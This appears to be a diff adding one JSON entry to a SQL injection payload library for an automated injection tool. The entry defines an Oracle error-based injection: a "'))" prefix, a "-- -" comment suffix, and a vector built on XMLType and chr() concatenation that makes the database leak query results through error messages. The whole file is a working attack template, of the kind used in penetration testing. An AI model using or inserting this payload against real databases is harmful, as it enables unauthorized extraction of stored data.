@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "error",
+ "boundary": {
+  "prefix": "'))",
+  "suffix": "-- -",
+  "type": "paren2-single",
+  "desc": "single-quoted inside 2 parentheses"
+ },
+ "vector": "{B} AND 1=(SELECT upper(XMLType(chr(60)||chr(58)||({Q}))) FROM dual)",
+ "comment": "oracle error via single-quoted inside 2 parentheses"
+}
